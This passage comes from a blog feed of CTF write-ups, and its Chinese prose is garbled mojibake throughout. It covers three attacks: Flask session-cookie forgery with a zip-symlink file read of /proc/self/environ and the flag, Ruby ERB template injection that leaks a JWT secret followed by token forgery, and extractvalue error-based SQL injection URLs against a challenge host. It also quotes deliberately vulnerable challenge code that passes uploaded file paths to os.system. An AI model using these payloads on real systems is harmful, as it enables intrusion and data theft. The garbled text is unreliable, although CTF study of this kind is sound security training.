¼å¼</span></span><br></pre></td></tr></table></figure><p>æŒ‰ç…§è¿™ä¸ªä»£ç è§£JWTç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 flask_session_manager.py decode -c <span class="string">"eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSqQQ.0VoijfPiLI6lwy9zvZ-yk5U5Lv8"</span> -s <span class="string">"keyqqqwwweee!@#$%^&amp;*"</span></span><br><span class="line">&#123;<span class="string">'id'</span>: <span class="string">b'100'</span>, <span class="string">'is_login'</span>: <span class="literal">True</span>, <span class="string">'password'</span>: <span class="string">'123'</span>, <span class="string">'username'</span>: <span class="string">'123'</span>&#125;</span><br><span class="line">è¿™é‡Œå°±å¯ä»¥çœ‹å‡ºä¸ä¸€æ ·äº†ï¼Œç°åœ¨è¿˜æ²¡ææ‡‚åŸå› ...</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 flask_session_manager.py encode -s <span class="string">"keyqqqwwweee!@#$%^&amp;*"</span> -t <span class="string">"&#123;'id': b'1', 'is_login': True, 'password': '123', 'username': '123'&#125;"</span></span><br><span class="line">eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSu2A.SeLyR45y3lQcF1dRjwzQw5Y<span class="number">-3</span>TE</span><br><span class="line">è¿™é‡Œæˆ‘ä»¬ä¼ªé€ id:<span class="string">b'1'</span>çš„ç”¨æˆ·sessionè¿›è¡Œç™»å½•</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ä¼ªé€ çš„sessionï¼ŒæˆåŠŸç™»å½•ï¼š<br><img src="http://ggb0n.cool/images/swpuctf01.png" alt=""></p><p>æŸ¥çœ‹æºç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/upload',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'id'</span>] != <span class="string">b'1'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">'POST'</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">'password'</span>]</span><br><span class="line">        name = name+<span class="string">'qweqweqwe'</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">'file'</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span>+md5_one+<span class="string">'/'</span>+session[<span class="string">'username'</span>]+<span class="string">"/"</span></span><br><span class="line">        path_base = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"zip"</span> != filename.split(<span class="string">'.'</span>)[<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'zip only allowed'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">"unzip -n -d "</span>+path+<span class="string">" "</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">'|'</span>) != <span class="number">-1</span> <span class="keyword">or</span> cmd.find(<span class="string">';'</span>) != <span class="number">-1</span>:</span><br><span class="line">waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">'r'</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">'is_login'</span>] != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'not login'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">'/'</span>) != <span class="number">-1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            image = open(path+unzip_filename, <span class="string">"rb"</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/showflag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showflag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == <span class="literal">False</span>:</span><br><span class="line">        image = open(os.path.join(<span class="string">'./flag/flag.jpg'</span>), <span class="string">"rb"</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"can't give you"</span></span><br></pre></td></tr></table></figure><p>ä»¥æ­£å¸¸é€»è¾‘æ¥çœ‹ï¼Œè¿™é‡Œçš„åŠŸèƒ½å°±æ˜¯å®¢æˆ·ç«¯ä¸Šä¼ ä¸€ä¸ªå‹ç¼©åçš„å›¾ç‰‡ï¼ŒæœåŠ¡ç«¯ä¼šè§£å‹ç¼©åå¹¶è¯»å–å›¾ç‰‡è¿”å›å®¢æˆ·ç«¯ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ª<code>è½¯é“¾æ¥å‹ç¼©åŒ…</code>ï¼Œæ¥è¯»å–å…¶ä»–æ•æ„Ÿæ–‡ä»¶è€Œä¸æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ã€‚</p><p>ç»“åˆ <code>showflag()</code>å‡½æ•°çš„æºç ï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥ <code>flag.jpg</code> æ”¾åœ¨ flask åº”ç”¨æ ¹ç›®å½•çš„<code>flag</code>ç›®å½•ä¸‹ã€‚é‚£ä¹ˆæˆ‘ä»¬åªè¦åˆ›å»ºä¸€ä¸ªåˆ°<code>/xxx/flask/flag/flag.jpg</code>çš„è½¯é“¾æ¥ï¼Œå³å¯è¯»å– <code>flag.jpg</code> æ–‡ä»¶ã€‚</p><p>ä¸¤ç§æ–¹å¼æ„é€ ï¼š</p><ul><li>1ã€åœ¨ linux ä¸­ï¼Œ<code>/proc/self/cwd/</code>ä¼šæŒ‡å‘è¿›ç¨‹çš„å½“å‰ç›®å½•ï¼Œé‚£ä¹ˆåœ¨ä¸çŸ¥é“ flask å·¥ä½œç›®å½•æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>/proc/self/cwd/flag/flag.jpg</code>æ¥è®¿é—® flag.jpgã€‚</li></ul><blockquote><p>å‘½ä»¤å¦‚ä¸‹ï¼š</p><p>ln -s /proc/self/cwd/flag/flag.jpg qwe </p><p>zip -ry qwe.zip qwe</p></blockquote><ul><li>2ã€åœ¨ linux ä¸­ï¼Œ<code>/proc/self/environ</code>æ–‡ä»¶é‡ŒåŒ…å«äº†è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä»ä¸­è·å– flask åº”ç”¨çš„ç»å¯¹è·¯å¾„ï¼Œå†é€šè¿‡ç»å¯¹è·¯å¾„åˆ¶ä½œè½¯é“¾æ¥æ¥è¯»å– flag.jpg (PSï¼šåœ¨æµè§ˆå™¨ä¸­ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥çœ‹åˆ°<code>/proc/self/environ</code>çš„å†…å®¹ï¼Œåªéœ€è¦ä¸‹è½½åˆ°æœ¬åœ°ï¼Œç”¨ notepad++æ‰“å¼€å³å¯)</li></ul><blockquote><p>å‘½ä»¤å¦‚ä¸‹ï¼š</p><p>ln -s /proc/self/environ qqq </p><p>zip -ry qqq.zip qqq </p><p>ln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg www </p><p>zip -ry [<a href="http://www.zip\]\(http://www.zip\)">www.zip\]\(http://www.zip\)</a> www</p></blockquote><h3 id="è§£é¢˜-1"><a href="#è§£é¢˜-1" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>åœ¨ä¸Šä¸€æ­¥ä¸­ï¼Œæˆ‘ä»¬å·²ç»æˆåŠŸæ‹¿åˆ°ä¸Šä¼ çš„æƒé™äº†ï¼Œç°åœ¨åˆ°linuxä¸­ç”Ÿæˆè¯»å–flagçš„è½¯è¿æ¥ï¼Œä¸Šä¼ ä¹‹åæœåŠ¡ç«¯å›æ˜¾å¦‚ä¸‹ï¼š<br><img src="http://ggb0n.cool/images/swpuctf04.png" alt=""></p><p>å› ä¸ºæ˜¯ä¸€ä¸ªæœ‰é—®é¢˜çš„å›¾ç‰‡ï¼Œæ— æ³•æ˜¾ç¤ºï¼Œå…¶å®å°±æ˜¯BUUæ”¹äº†ï¼Œå®ƒæœ¬è´¨ä¸Šè¿˜æ˜¯ä¸€ä¸ªtxtï¼Œä¸‹è½½ä¸‹æ¥å³å¯æ‹¿åˆ°flagã€‚</p><h2 id="Flag-Shop"><a href="#Flag-Shop" class="headerlink" title="Flag Shop"></a>Flag Shop</h2><p>è€ƒå¯ŸJWTä¼ªé€ ï¼Œrubyçš„ERBæ¨¡æ¿æ³¨å…¥ã€‚åè€…æ˜¯ç¬¬ä¸€æ¬¡æ¥è§¦</p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®å‘ç°å¯ä»¥ä¹°flagï¼Œä½†æ˜¯å¾ˆè´µï¼Œè¿™ä¸ªæ—¶å€™åˆå¯ä»¥è¿›è¡Œworkæ‹¿jklï¼Œè¿™ç‚¹åˆ°å•¥æ—¶å€™å»å•Šâ€¦<br><img src="http://ggb0n.cool/images/swpuctf05.png" alt=""></p><p>ä¸è¿‡å­˜åœ¨robots.txtï¼Œæç¤ºäº†<code>filebake</code>çš„å­˜åœ¨ï¼š<br><img src="http://ggb0n.cool/images/swpuctf06.png" alt=""></p><p>è®¿é—®<code>fileback</code>æ‹¿åˆ°æºç ï¼š</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/cookies'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/json'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'jwt'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'securerandom'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'erb'</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/static'</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">"SECRET"</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = File.new(File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/../log/http.log'</span>,<span class="string">"a+"</span>)</span><br><span class="line">  file.sync = <span class="literal">true</span></span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/"</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">'/shop'</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/filebak"</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb IO.binread __FILE_<span class="number">_</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/auth"</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/info"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">"uid"</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/work"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">"SECRET"</span>].match(<span class="string">"<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>"</span>)</span><br><span class="line">      puts ENV[<span class="string">"FLAG"</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">"<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working"</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">"jkl"</span>] = auth[<span class="string">"jkl"</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!')&lt;/script&gt;"</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>] &lt; FLAGPRICE <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">"error"</span>,<span class="symbol">message:</span> <span class="string">"no enough jkl"</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">"FLAG"</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">"success"</span>,<span class="symbol">message:</span> <span class="string">"jkl is good thing"</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">'/shop'</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>ä»£ç æ˜¯rubyå†™çš„ï¼Œè¿˜æ²¡å­¦â€¦ä¸è¿‡ä»ä»£ç ä¸­å¯ä»¥çœ‹åˆ°å‡ºç°äº†<code>JWT</code>ï¼Œåº”è¯¥è·ŸJWTä¼ªé€ æœ‰å…³ï¼Œç¨å¾®å®¡ä¸€ä¸‹ä»£ç å‘ç°<code>jkl</code>æŒ‡çš„åº”è¯¥å°±æ˜¯é‡‘å¸æ•°é‡ï¼ŒåŒuidä¸€èµ·å†™è¿›äº†cookieé‡Œï¼ŒæŠ“ä¸ªåŒ…æ‹¿jwtè§£å¯†çœ‹çœ‹ï¼š<br><img src="http://ggb0n.cool/images/swpuctf07.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°<code>jkl</code>çš„å€¼ä¸º<code>28</code>ï¼Œä¹Ÿå°±æ˜¯ç°æœ‰çš„é‡‘å¸æ•°ï¼Œé‚£åº”è¯¥å°±æ˜¯è¦ä¼ªé€ <code>JWT</code>æ¥ä¹°åˆ°flagäº†ï¼Œä½†æ˜¯ä¼ªé€ éœ€è¦<code>SECRET</code>ï¼Œç°åœ¨æˆ‘ä»¬å¹¶æ²¡æœ‰ï¼Œæ€ä¹ˆåŠï¼Ÿ</p><p>åœ¨<code>/work</code>è·¯ç”±ä¸‹æœ‰è¿™ä¹ˆä¸€æ®µä»£ç ï¼š</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!')</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œä½†æ˜¯åªæœ‰7ä¸ªå­—ç¬¦ï¼Œå‚è€ƒé¢˜è§£è¯´æ˜¯<code>ERBæ¨¡æ¿æ³¨å…¥</code>ï¼Œè¿™é‡Œå¯ä»¥ç”¨rubyçš„é¢„å®šä¹‰å­—ç¬¦<code>$</code>å¯¹åŒ¹é…çš„å­—ç¬¦ä¸²è¿›è¡Œè¯»å–ï¼Œä»è€Œè·å–<code>SECRET</code>ï¼Œlåˆ©ç”¨ç‚¹å½“ç„¶ä¹Ÿå°±åœ¨<code>/work</code>è·¯ç”±ä¸‹äº†ï¼Œå¯ä»¥æŠ“åŒ…çœ‹çœ‹ï¼š</p><p><img src="http://ggb0n.cool/images/swpuctf08.png" alt=""></p><p>æ ¹æ®å‚æ•°æ„é€ payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;work?SECRET&#x3D;&amp;name&#x3D;%3c%25%3d%24%27%25%3e&amp;do&#x3D;%3c%25%3d%24%27%25%3e%20is%20working</span><br><span class="line">å³</span><br><span class="line">&#x2F;work?SECRET&#x3D;&amp;name&#x3D;&lt;%&#x3D;$&#39;%&gt;&amp;do&#x3D;&lt;%&#x3D;$&#39;%&gt; is working</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="http://ggb0n.cool/images/swpuctf09.png" alt=""></p><p>æ‹¿åˆ°SECRETä¹‹åï¼Œè¿›è¡ŒJWTä¼ªé€ ï¼š<br><img src="http://ggb0n.cool/images/swpuctf10.png" alt=""></p><p>ç„¶å<code>buy flag</code>æŠ“åŒ…è¿›è¡Œæ›¿æ¢å³å¯ä¹°åˆ°flagï¼š<br><img src="http://ggb0n.cool/images/swpuctf11.png" alt=""></p><p>ç”±å“åº”ç»“æœå¯ä»¥çœ‹åˆ°ï¼Œå·²ç»æˆåŠŸä¹°åˆ°äº†flagï¼Œä½†æ˜¯å“åº”ä¸­å¹¶æ²¡æœ‰å•Šï¼Œå› ä¸ºåœ¨ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œflagå…¶å®è¢«å†™å…¥åˆ°äº†ç›¸åº”çš„JWTä¸­ï¼Œå†å»è§£å¯†å³å¯æ‹¿åˆ°ã€‚<br><img src="http://ggb0n.cool/images/swpuctf12.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¸€ç›´æƒ³ç€å¤ç°æ¥ç€ï¼Œè®°äº‹æœ¬é‡Œä¹Ÿè®°å½•äº†å‡ ä¸ªæœˆäº†â€¦ğŸ¤£
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="èµ›é¢˜å¤ç°" scheme="http://ggb0n.cool/categories/CTF/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Cookieæ”»å‡»" scheme="http://ggb0n.cool/tags/Cookie%E6%94%BB%E5%87%BB/"/>
    
      <category term="SQLæ³¨å…¥" scheme="http://ggb0n.cool/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="äºŒæ¬¡æ³¨å…¥" scheme="http://ggb0n.cool/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    
      <category term="JWTä¼ªé€ " scheme="http://ggb0n.cool/tags/JWT%E4%BC%AA%E9%80%A0/"/>
    
      <category term="æ— åˆ—åæŸ¥è¯¢" scheme="http://ggb0n.cool/tags/%E6%97%A0%E5%88%97%E5%90%8D%E6%9F%A5%E8%AF%A2/"/>
    
      <category term="ERBæ¨¡æ¿æ³¨å…¥" scheme="http://ggb0n.cool/tags/ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>RootersCTFå¤ç°</title>
    <link href="http://ggb0n.cool/2020/03/13/RootersCTF%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ggb0n.cool/2020/03/13/RootersCTF%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-03-13T14:50:13.000Z</published>
    <updated>2020-05-13T03:09:11.996Z</updated>
    
    <content type="html"><![CDATA[<p>CTFtimeä¸Šå›½å¤–çš„æ¯”èµ›è¿˜æ˜¯æ¯”è¾ƒå¤šçš„ï¼Œè€Œä¸”å¤§å¤šä¹Ÿéƒ½æ¯”è¾ƒæœ‰æ„æ€ï¼Œå¼€æ‹“è§†é‡ã€‚<a id="more"></a></p><h2 id="RootersCTF-Babyweb"><a href="#RootersCTF-Babyweb" class="headerlink" title="RootersCTF-Babyweb"></a>RootersCTF-Babyweb</h2><p>My junior dev just set up a password protected webpage. Can you get in?</p><h3 id="åˆ†æè¿‡ç¨‹"><a href="#åˆ†æè¿‡ç¨‹" class="headerlink" title="åˆ†æè¿‡ç¨‹"></a>åˆ†æè¿‡ç¨‹</h3><p>æ‰“å¼€é“¾æ¥æç¤ºç®¡ç†å‘˜çš„å¯†ç æ˜¯18ä½ï¼Œå¹¶ä¸”è¿‡æ»¤æ‰äº†UNION SLEEP â€˜ â€œ OR - BENCHMARKã€‚å› æ­¤åˆ©ç”¨çˆ†ç ´å‡ºå¯†ç æ˜¯æ¯”è¾ƒä¸ç°å®çš„ï¼Œç»“åˆé¢˜ç›®æç¤ºæ˜¯ä½¿ç”¨æ³¨å…¥æ–¹æ³•ã€‚çœ‹åˆ°å•å¼•å·å’ŒåŒå¼•å·è¢«è¿‡æ»¤ï¼ŒçŒœæµ‹æ˜¯è¢«åæ–œæ è½¬ä¹‰æ‰ï¼Œä¾¿å°è¯•å®½å­—èŠ‚æ³¨å…¥ï¼Œä½¿ç”¨<code>%df%27</code>è¿›è¡Œæµ‹è¯•ï¼Œç»“æœæ³¨å…¥å¤±è´¥ã€‚</p><p>å¹¶ä¸”æç¤ºUNIONã€ORä¹Ÿéƒ½è¢«è¿‡æ»¤ï¼ŒåŸæœ¬æƒ³ç€åˆ©ç”¨å¤§å°å†™æˆ–è€…ç¼–ç ç»•è¿‡ï¼Œä½†æ˜¯å¼•å·æ—¢ç„¶ä¸èƒ½æˆåŠŸç»•è¿‡ï¼Œè¯´æ˜ä¸èƒ½ç”¨é—­åˆå¼•å·è¿›è¡Œæ³¨å…¥ã€‚ç»è¿‡å¤šæ¬¡å°è¯•å‘ç°åˆ©ç”¨<code>extractvalue()</code>å‡½æ•°è¿›è¡ŒæŠ¥é”™æ³¨å…¥å¯ä»¥æˆåŠŸå®ç°æ³¨å…¥,å› æ­¤å¯ä»¥ç»“åˆconcatå‡½æ•°å®ç°æ³¨å…¥ã€‚</p><p><code>extractvalue()</code>ï¼šå‡½æ•°åŠŸèƒ½æ˜¯ä»ç›®æ ‡XMLä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²ã€‚</p><blockquote><p>EXTRACTVALUE (XML_document, XPath_string);</p><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²)</p><p>extractvalueæ³¨å…¥çš„åŸç†ï¼šå¦‚åŒupdatexmlä¸€æ ·ï¼Œextractçš„ç¬¬äºŒä¸ªå‚æ•°è¦æ±‚æ˜¯xpathæ ¼å¼å­—ç¬¦ä¸²ï¼Œè€Œæˆ‘ä»¬è¾“å…¥çš„å¹¶ä¸æ˜¯ã€‚æ‰€ä»¥æŠ¥é”™ã€‚</p></blockquote><h3 id="æ³¨å…¥è¿‡ç¨‹"><a href="#æ³¨å…¥è¿‡ç¨‹" class="headerlink" title="æ³¨å…¥è¿‡ç¨‹"></a>æ³¨å…¥è¿‡ç¨‹</h3><p>1ã€çˆ†åº“å</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">https://babyweb.rootersctf.<span class="keyword">in</span>/<span class="keyword">index</span>.php?<span class="keyword">search</span>=<span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>%<span class="number">0</span>adatabase()),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p>å›æ˜¾XPATH syntax error:~SQLinjection~ï¼Œçˆ†å‡ºäº†åº“åSQLinjection<br>2ã€çˆ†è¡¨å</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">https://babyweb.rootersctf.<span class="keyword">in</span>/<span class="keyword">index</span>.php?<span class="keyword">search</span>=<span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span 